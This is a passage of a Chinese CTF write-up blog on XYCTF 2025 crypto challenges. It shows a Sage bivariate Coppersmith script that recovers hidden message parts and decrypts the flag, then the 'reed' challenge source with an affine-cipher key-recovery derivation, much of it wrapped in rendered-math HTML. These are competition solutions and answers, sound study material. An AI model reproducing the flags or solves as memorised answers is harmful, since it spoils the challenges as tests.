style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathnormal">x</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">h</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">h</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace nobreak"> </span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:7.55em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span></span></span></span></span></span></span></p><ul><li>这时我们就列出了一个<code>coppersmith</code>求解形式的方程，但是这时我们会发现这里面有俩个未知数，所以显而易见，可以尝试使用二元<code>coppersmith</code>攻击。网上有现成的脚本可以使用。（不懂原理，只会当脚本小子）。这边有俩个方程式，经过尝试，我们可以通过<code>f1</code>这个方程式求出<code>x</code>和<code>y</code>，或者通过<code>f1-f2</code>这个方程式求出<code>x</code>和<code>y</code>，但是使用<code>f2</code>这个方程式并不能解出<code>x</code>和<code>y</code></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">small_roots2</span>(<span class="params">f, bounds, m=<span class="number">1</span>, d=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> d:</span><br><span class="line">        d = f.degree()</span><br><span class="line"></span><br><span class="line">    R = f.base_ring()</span><br><span class="line">    N = R.cardinality()</span><br><span class="line"></span><br><span class="line">    f /= f.coefficients().pop(<span class="number">0</span>)</span><br><span class="line">    f = f.change_ring(ZZ)</span><br><span class="line"></span><br><span class="line">    G = <span class="type">Sequence</span>([], f.parent())</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m + <span class="number">1</span>):</span><br><span class="line">        base = N ^ (m - i) * f ^ i</span><br><span class="line">        <span class="keyword">for</span> shifts <span class="keyword">in</span> itertools.product(<span class="built_in">range</span>(d), repeat=f.nvariables()):</span><br><span class="line">            g = base * prod(<span class="built_in">map</span>(power, f.variables(), shifts))</span><br><span class="line">            G.append(g)</span><br><span class="line"></span><br><span class="line">    B, monomials = G.coefficient_matrix()</span><br><span class="line">    monomials = vector(monomials)</span><br><span class="line"></span><br><span class="line">    factors = [monomial(*bounds) <span class="keyword">for</span> monomial <span class="keyword">in</span> monomials]</span><br><span class="line">    <span class="keyword">for</span> i, factor <span class="keyword">in</span> <span class="built_in">enumerate</span>(factors):</span><br><span class="line">        B.rescale_col(i, factor)</span><br><span class="line"></span><br><span class="line">    B = B.dense_matrix().LLL()</span><br><span class="line"></span><br><span class="line">    B = B.change_ring(QQ)</span><br><span class="line">    <span class="keyword">for</span> i, factor <span class="keyword">in</span> <span class="built_in">enumerate</span>(factors):</span><br><span class="line">        B.rescale_col(i, <span class="number">1</span> / factor)</span><br><span class="line"></span><br><span class="line">    H = <span class="type">Sequence</span>([], f.parent().change_ring(QQ))</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">filter</span>(<span class="literal">None</span>, B * monomials):</span><br><span class="line">        H.append(h)</span><br><span class="line">        I = H.ideal()</span><br><span class="line">        <span class="keyword">if</span> I.dimension() == -<span class="number">1</span>:</span><br><span class="line">            H.pop()</span><br><span class="line">        <span class="keyword">elif</span> I.dimension() == <span class="number">0</span>:</span><br><span class="line">            roots = []</span><br><span class="line">            <span class="keyword">for</span> root <span class="keyword">in</span> I.variety(ring=ZZ):</span><br><span class="line">                root = <span class="built_in">tuple</span>(R(root[var]) <span class="keyword">for</span> var <span class="keyword">in</span> f.variables())</span><br><span class="line">                roots.append(root)</span><br><span class="line">            <span class="keyword">return</span> roots</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> []</span><br><span class="line">mh = [<span class="number">3960604425233637243960750976884707892473356737965752732899783806146911898367312949419828751012380013933993271701949681295313483782313836179989146607655230162315784541236731368582965456428944524621026385297377746108440938677401125816586119588080150103855075450874206012903009942468340296995700270449643148025957527925452034647677446705198250167222150181312718642480834399766134519333316989347221448685711220842032010517045985044813674426104295710015607450682205211098779229647334749706043180512861889295899050427257721209370423421046811102682648967375219936664246584194224745761842962418864084904820764122207293014016</span>, <span class="number">15053801146135239412812153100772352976861411085516247673065559201085791622602365389885455357620354025972053252939439247746724492130435830816513505615952791448705492885525709421224584364037704802923497222819113629874137050874966691886390837364018702981146413066712287361010611405028353728676772998972695270707666289161746024725705731676511793934556785324668045957177856807914741189938780850108643929261692799397326838812262009873072175627051209104209229233754715491428364039564130435227582042666464866336424773552304555244949976525797616679252470574006820212465924134763386213550360175810288209936288398862565142167552</span>]</span><br><span class="line">n = <span class="number">24240993137357567658677097076762157882987659874601064738608971893024559525024581362454897599976003248892339463673241756118600994494150721789525924054960470762499808771760690211841936903839232109208099640507210141111314563007924046946402216384360405445595854947145800754365717704762310092558089455516189533635318084532202438477871458797287721022389909953190113597425964395222426700352859740293834121123138183367554858896124509695602915312917886769066254219381427385100688110915129283949340133524365403188753735534290512113201932620106585043122707355381551006014647469884010069878477179147719913280272028376706421104753</span></span><br><span class="line">C = [<span class="number">5300743174999795329371527870190100703154639960450575575101738225528814331152637733729613419201898994386548816504858409726318742419169717222702404409496156167283354163362729304279553214510160589336672463972767842604886866159600567533436626931810981418193227593758688610512556391129176234307448758534506432755113432411099690991453452199653214054901093242337700880661006486138424743085527911347931571730473582051987520447237586885119205422668971876488684708196255266536680083835972668749902212285032756286424244284136941767752754078598830317271949981378674176685159516777247305970365843616105513456452993199192823148760</span>, <span class="number">21112179095014976702043514329117175747825140730885731533311755299178008997398851800028751416090265195760178867626233456642594578588007570838933135396672730765007160135908314028300141127837769297682479678972455077606519053977383739500664851033908924293990399261838079993207621314584108891814038236135637105408310569002463379136544773406496600396931819980400197333039720344346032547489037834427091233045574086625061748398991041014394602237400713218611015436866842699640680804906008370869021545517947588322083793581852529192500912579560094015867120212711242523672548392160514345774299568940390940653232489808850407256752</span>]</span><br><span class="line"></span><br><span class="line">PR.&lt;x,y&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f1 = (mh[<span class="number">0</span>]+x)^<span class="number">3</span> - <span class="number">3</span>*(mh[<span class="number">0</span>]+x)*(mh[<span class="number">1</span>]+y)^<span class="number">2</span> - C[<span class="number">0</span>] </span><br><span class="line">f2 = <span class="number">3</span>*(mh[<span class="number">1</span>]+y)*(mh[<span class="number">0</span>]+x)^<span class="number">2</span> - (mh[<span class="number">1</span>]+y)^<span class="number">3</span> - C[<span class="number">1</span>]</span><br><span class="line"><span class="comment">#f = f1-f2</span></span><br><span class="line">x,y = small_roots2(f1,[<span class="number">2</span>^<span class="number">128</span>,<span class="number">2</span>^<span class="number">128</span>],<span class="number">4</span>,d=<span class="number">3</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(x)</span><br><span class="line"><span class="built_in">print</span>(y)</span><br><span class="line">m1 = x + mh[<span class="number">0</span>]</span><br><span class="line">m2 = y + mh[<span class="number">1</span>]</span><br><span class="line">enc = <span class="string">b&#x27;\x9c\xc4n\x8dF\xd9\x9e\xf4\x05\x82!\xde\xfe\x012$\xd0\x8c\xaf\xfb\rEb(\x04)\xa1\xa6\xbaI2J\xd2\xb2\x898\x11\xe6x\xa9\x19\x00pn\xf6rs- \xd2\xd1\xbe\xc7\xf51.\xd4\xd2 \xe7\xc6\xca\xe5\x19\xbe&#x27;</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ChaCha20</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="built_in">print</span>(ChaCha20.new(key=hashlib.sha256(<span class="built_in">str</span>(m1 + m2).encode()).digest(), nonce=<span class="string">b&#x27;Pr3d1ctmyxjj&#x27;</span>).decrypt(enc))</span><br></pre></td></tr></table></figure><ul><li>最终flag如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">b&#x27;XYCTF&#123;Welcome_to_XYCTF_Now_let_us_together_play_Crypto_challenge&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="reed"><a class="markdownIt-Anchor" href="#reed"></a> reed</h2><h3 id="非预期"><a class="markdownIt-Anchor" href="#非预期"></a> 非预期</h3><ul><li>题目描述如下，同时发现是一个<code>nc</code>题目：</li></ul><p><img src="/2025/04/14/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025XYCTF-wp/image-20250405183822530.png" alt="image-20250405183822530"></p><ul><li>查看题目附件，该程序是，附件的程序给了一个<code>PRNG</code>类，进行伪随机数的生成，生成<code>n</code>轮的伪随机数，将模一轮生成的为随机数给<code>a</code>，将之后m轮的伪随机数生成给<code>b</code>，然后再进行一个线性仿射运算。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">assert</span> flag.startswith(<span class="string">&#x27;XYCTF&#123;&#x27;</span>) <span class="keyword">and</span> flag.endswith(<span class="string">&#x27;&#125;&#x27;</span>)</span><br><span class="line">flag = flag.rstrip(<span class="string">&#x27;&#125;&#x27;</span>).lstrip(<span class="string">&#x27;XYCTF&#123;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">table = string.ascii_letters + string.digits</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">all</span>(i <span class="keyword">in</span> table <span class="keyword">for</span> i <span class="keyword">in</span> flag)</span><br><span class="line">r = random.Random()</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">PRNG</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, seed</span>):</span><br><span class="line">        self.a = <span class="number">1145140</span></span><br><span class="line">        self.b = <span class="number">19198100</span></span><br><span class="line">        random.seed(seed)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">next</span>(<span class="params">self</span>):</span><br><span class="line">        x = random.randint(self.a, self.b)</span><br><span class="line">        random.seed(x ** <span class="number">2</span> + <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> x</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">round</span>(<span class="params">self, k</span>):</span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(k):</span><br><span class="line">            x = self.<span class="built_in">next</span>()</span><br><span class="line">            <span class="built_in">print</span>(x)</span><br><span class="line">            <span class="keyword">assert</span> x &lt; <span class="number">19198111</span></span><br><span class="line">        <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">msg, a, b</span>):</span><br><span class="line">    c = [(a * table.index(m) + b) % <span class="number">19198111</span> <span class="keyword">for</span> m <span class="keyword">in</span> msg]</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line">seed = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;give me seed: &#x27;</span>))</span><br><span class="line">prng = PRNG(seed)</span><br><span class="line">a = prng.<span class="built_in">round</span>(r.randrange(<span class="number">2</span>**<span class="number">16</span>))</span><br><span class="line">b = prng.<span class="built_in">round</span>(r.randrange(<span class="number">2</span>**<span class="number">16</span>))</span><br><span class="line">enc = encrypt(flag, a, b)</span><br><span class="line"><span class="built_in">print</span>(enc)</span><br><span class="line"><span class="built_in">print</span>(<span class="number">2</span>**<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(r.randrange(<span class="number">2</span>**<span class="number">16</span>))</span><br><span class="line"><span class="built_in">print</span>(table)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">[18078408, 18078408, 13896256, 6102835, 18078408, 13896256, 8200396, 4018244, 2305595, 15993817, 4589127, 7058630, 14852051, 4018244, 3447361, 14281168, 4018244, 2876478, 2876478, 14852051, 4589127, 8771279, 3447361, 406975, 15993817, 10669899, 14852051, 6487747, 2876478, 18078408, 13325373, 18078408, 13325373, 1920683, 18078408, 6673718]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><ul><li>这题的思路不知道是不是非预期，重点主要在仿射加密这边，仿射加密虽然<code>a</code>和<code>b</code>比较大不好爆破，但是由仿射加密的公式</li></ul><p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable rowspacing="0.15999999999999992em" columnalign="left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>c</mi><mn>1</mn></msub><mo>≡</mo><mi>a</mi><mo>∗</mo><msub><mi>m</mi><mn>1</mn></msub><mo>+</mo><mi>b</mi><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mo stretchy="false">(</mo><mn>19198111</mn><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>c</mi><mn>2</mn></msub><mo>≡</mo><mi>a</mi><mo>∗</mo><msub><mi>m</mi><mn>2</mn></msub><mo>+</mo><mi>b</mi><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mo stretchy="false">(</mo><mn>19198111</mn><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mtext>这样就有</mtext></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>c</mi><mn>1</mn></msub><mo>−</mo><msub><mi>c</mi><mn>2</mn></msub><mo>=</mo><mi>a</mi><mo>∗</mo><mo stretchy="false">(</mo><msub><mi>m</mi><mn>1</mn></msub><mo>−</mo><msub><mi>m</mi><mn>2</mn></msub><mo stretchy="false">)</mo><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mo stretchy="false">(</mo><mn>19198111</mn><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mtext>可以得到</mtext></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>a</mi><mo>≡</mo><mo stretchy="false">(</mo><msub><mi>c</mi><mn>1</mn></msub><mo>−</mo><msub><mi>c</mi><mn>2</mn></msub><mo stretchy="false">)</mo><mo>∗</mo><mo stretchy="false">(</mo><msub><mi>m</mi><mn>1</mn></msub><mo>−</mo><msub><mi>m</mi><mn>2</mn></msub><msup><mo stretchy="false">)</mo><mrow><mo>−</mo><mn>1</mn></mrow></msup><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mn>19198111</mn><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>由于</mtext><mi>m</mi><mtext>的取值比较小</mtext><mo separator="true">,</mo><mtext>我们可以直接先爆破出</mtext><msub><mi>m</mi><mn>1</mn></msub><mtext>和</mtext><msub><mi>m</mi><mn>2</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>m</mi><mn>1</mn></msub><mtext>和</mtext><msub><mi>m</mi><mn>2</mn></msub><mtext>一旦出来后就可以求得</mtext><mi>a</mi><mo separator="true">,</mo><mtext>求得</mtext><mi>a</mi><mtext>后</mtext><mi>b</mi><mtext>也能求了</mtext></mrow></mstyle></mtd></mtr></mtable><annotation encoding="application/x-tex">\begin{array}{l}c_1 \equiv a*m_1 + b ~mod~(19198111)\\c_2 \equiv a*m_2 + b ~mod~(19198111)\\这样就有\\c_1-c_2=a*(m_1-m_2)~mod~(19198111)\\可以得到\\a \equiv (c_1-c_2)*(m_1-m_2)^{-1}~mod(19198111)\\由于m的取值比较小,我们可以直接先爆破出m_1和m_2\\m_1和m_2一旦出来后就可以求得a,求得a后b也能求了\end{array}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:9.600000000000001em;vertical-align:-4.55em;"></span><span class="mord"><span class="mtable"><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:5.050000000000001em;"><span style="top:-7.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathnormal">b</span><span class="mspace nobreak"> </span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace nobreak"> </span><span class="mopen">(</span><span class="mord">1</span><span class="mord">9</span><span class="mord">1</span><span class="mord">9</span><span class="mord">8</span><span class="mord">1</span><span class="mord">1</span><span class="mord">1</span><span class="mclose">)</span></span></span><span style="top:-6.010000000000001em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathnormal">b</span><span class="mspace nobreak"> </span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace nobreak"> </span><span class="mopen">(</span><span class="mord">1</span><span class="mord">9</span><span class="mord">1</span><span class="mord">9</span><span class="mord">8</span><span class="mord">1</span><span class="mord">1</span><span class="mord">1</span><span class="mclose">)</span></span></span><span style="top:-4.8100000000000005em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord cjk_fallback">这</span><span class="mord cjk_fallback">样</span><span class="mord cjk_fallback">就</span><span class="mord cjk_fallback">有</span></span></span><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace nobreak"> </span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace nobreak"> </span><span class="mopen">(</span><span class="mord">1</span><span class="mord">9</span><span class="mord">1</span><span class="mord">9</span><span class="mord">8</span><span class="mord">1</span><span class="mord">1</span><span class="mord">1</span><span class="mclose">)</span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord cjk_fallback">可</span><span class="mord cjk_fallback">以</span><span class="mord cjk_fallback">得</span><span class="mord cjk_fallback">到</span></span></span><span style="top:-1.2099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" 